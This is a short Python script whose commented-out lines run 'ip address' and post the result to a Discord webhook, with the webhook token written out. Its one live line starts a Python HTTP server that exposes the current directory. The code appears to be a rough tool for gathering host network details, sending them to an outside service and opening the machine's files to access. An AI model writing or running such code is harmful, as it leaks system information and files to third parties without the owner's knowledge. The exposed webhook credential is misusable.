import subprocess
import requests

def main():
    #output = subprocess.run("ip address", capture_output=True, text=True, shell=True).stdout
    #req = requests.post("https://discord.com/api/webhooks/1399488030167011450/Xu6jupN5KCD7NC4VI3Uupg01OmgZMVe-Dd3-KVWEgDy2AZaO0D-KnUc9YSXcvLhxYn7g", json = msg)
    subprocess.run("python3 -m http.server", capture_output=True, text=True, shell=True).stdout

if __name__ == "__main__":
    main()
